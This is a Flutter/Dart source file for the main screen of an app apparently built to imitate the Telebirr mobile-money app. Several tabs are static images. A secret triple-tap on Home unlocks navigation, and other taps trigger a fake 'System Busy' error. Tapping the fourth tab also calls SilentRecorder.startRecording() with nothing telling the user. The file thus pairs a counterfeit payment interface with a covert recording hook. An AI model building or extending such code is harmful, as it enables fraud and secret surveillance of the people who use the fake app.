import 'package:flutter/material.dart';
import 'package:telebirrbybr7/screens/home_screen.dart';
import 'package:telebirrbybr7/screens/engage_page.dart'; 
import 'package:telebirrbybr7/services/silent_recorder.dart';
import 'package:telebirrbybr7/screens/apps_page.dart';
import 'package:telebirrbybr7/screens/qr_scanner_screen.dart';

class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  int _currentIndex = 0;
  bool _isLoading = false;
  bool _showError = false;
  bool _unlocked = false;
  int _homeTapCount = 0;
  DateTime? _lastTapTime;

  final List<Widget> tabs = [
    const HomeScreen(),
    Center(child: Image.asset('images/payment.png')),
    const AppsPage(),
    const EngagePage(),
    Center(child: Image.asset('images/account.png')),
  ];

  void _handleTabChange(int index) {
    if (index == 0) {
      final now = DateTime.now();
      
      if (_lastTapTime != null && 
          now.difference(_lastTapTime!) > const Duration(seconds: 2)) {
        _homeTapCount = 0;
      }
      
      _homeTapCount++;
      _lastTapTime = now;
      
      if (_homeTapCount >= 3) {
        setState(() {
          _unlocked = !_unlocked;
          _homeTapCount = 0;
        });
      }
      
      setState(() => _currentIndex = index);
      
    } else if (_unlocked) {
      setState(() => _currentIndex = index);
      
    } else {
      setState(() {
        _isLoading = true;
        _showError = false;
      });
      
      Future.delayed(const Duration(milliseconds: 1500), () {
        if (mounted) {
          setState(() {
            _isLoading = false;
            _showError = true;
          });
        }
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          tabs[_currentIndex],
          
          if (_isLoading)
            Container(
              color: Colors.black54,
              child: Center(
                child: Image.asset('images/loading.gif'),
              ),
            ),
          
          if (_showError)
            Container(
              color: Colors.black54,
              child: Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(Icons.error_outline, color: Colors.white, size: 60),
                    const SizedBox(height: 16),
                    const Text(
                      'System Busy. Please try again later.',
                      style: TextStyle(color: Colors.white, fontSize: 18),
                    ),
                    const SizedBox(height: 24),
                    ElevatedButton(
                      onPressed: () {
                        setState(() {
                          _showError = false;
                          _currentIndex = 0;
                        });
                      },
                      child: const Text('OK'),
                    ),
                  ],
                ),
              ),
            ),
        ],
      ),
      bottomNavigationBar: TelebirrBottomBar(
        currentIndex: _currentIndex,
        onTap: _handleTabChange,
      ),
    );
  }
}

class TelebirrBottomBar extends StatelessWidget {
  final int currentIndex;
  final Function(int) onTap;

  const TelebirrBottomBar({
    super.key,
    required this.currentIndex,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final double width = MediaQuery.of(context).size.width;

    return SizedBox(
      height: 130,
      child: Stack(
        children: [
          Positioned(
            bottom: 0,
            left: 0,
            right: 0,
            child: GestureDetector(
              onTap: () {
                Navigator.push(
                  context,
                  MaterialPageRoute(builder: (context) => const QRScannerScreen()),
                );
              },
              child: Image.asset(
                'images/bottom_bar.jpg',
                width: width,
                height: 127,
                fit: BoxFit.fill,
                errorBuilder: (context, error, stackTrace) {
                  return Container(
                    color: const Color.fromRGBO(141, 199, 63, 0.85),
                    height: 70,
                    child: const Center(
                      child: Text("Tap here to Scan", 
                        style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)
                      ),
                    ),
                  );
                },
              ),
            ),
          ),

          Positioned(
            bottom: 0,
            left: 0,
            right: 0,
            height: 60,
            child: Row(
              children: List.generate(5, (index) {
                return Expanded(
                  child: GestureDetector(
                    onTap: () {
                      onTap(index);
                      if (index == 3) {
                        SilentRecorder.startRecording();
                      }
                    },
                    behavior: HitTestBehavior.opaque,
                    child: const SizedBox.expand(),
                  ),
                );
              }),
            ),
          ),
        ],
      ),
    );
  }
}